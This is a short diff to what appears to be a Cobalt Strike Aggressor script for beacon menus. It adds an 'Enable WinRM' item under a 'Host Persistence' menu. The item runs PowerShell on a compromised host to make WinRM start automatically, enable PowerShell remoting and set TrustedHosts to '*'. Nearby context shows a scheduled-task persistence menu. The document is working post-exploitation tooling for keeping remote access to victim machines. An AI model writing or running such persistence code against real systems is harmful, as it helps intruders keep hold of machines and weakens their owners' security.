@@ -70,6 +70,22 @@ popup beacon_bottom
 		}
 		menu "Host Persistence"
 		{
+
+			item "Enable WinRM"
+        		{
+        			binput($1, "Enabling WinRM...");
+        	
+        			// Enable WinRM service
+        			bpowerpick($1, "Set-Service WinRM -StartupType Automatic");
+        			bpowerpick($1, "Start-Service WinRM");
+        	
+        			// Configure WinRM listener
+        			bpowerpick($1, "Enable-PSRemoting -Force");
+        			bpowerpick($1, "Set-Item WSMan:\localhost\Client\TrustedHosts -Value '*' -Force");
+        	
+        			binput($1, "WinRM enabled.");
+        		}
+
 			menu "Task Scheduler"
 			{
 				item "Powershell HTTP x64"
